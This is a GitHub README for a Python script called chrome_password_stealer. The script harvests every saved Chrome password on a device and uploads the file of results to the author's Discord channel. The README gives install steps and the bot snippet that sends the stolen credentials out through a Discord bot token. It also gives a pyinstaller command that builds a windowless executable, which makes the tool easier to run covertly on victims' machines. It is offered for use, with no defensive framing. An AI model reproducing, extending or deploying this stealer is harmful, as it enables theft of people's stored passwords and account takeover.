
# chrome_password_stealer
This python script steals all the chrome password stored in a device ans uploads them into a discord server
## instalation
Download or clone the repository and eecute this command to install all dependencies, if you want to compile to a exe file you will need to install pyinstaller too.
```bash
pip install -r requirements.txt
pip install pyinstaller
```
Before running the code you need to set up some variables
```bash
    @bot.event
    async def on_ready():#when the bot is ready sends the results file to the discord channel
        channel = bot.get_channel("YOUR CHANEL ID")
        if channel:
            await channel.send(file=discord.File('results.json'))
        await bot.close()
    bot.run('YOUR BOT TOKEN') 
```
You need to replace YOUR BOT TOKEN with your actual bot token from discord and YOUR CHANEL ID with the actual chanel id also from discord.

To compile to a .exe file run this command where the chrome.py file is stored
```bash
pyinstaller --onefile --windowed chrome.py
```
## Discord setup
First you need to enable the developer mode for discord. To do so you need to acces the configuration then advanced and enable the developer mode 
![Alt text](https://github.com/lleeerrriiiccc/chrome_password_stealer/blob/main/images/developer_mode.png)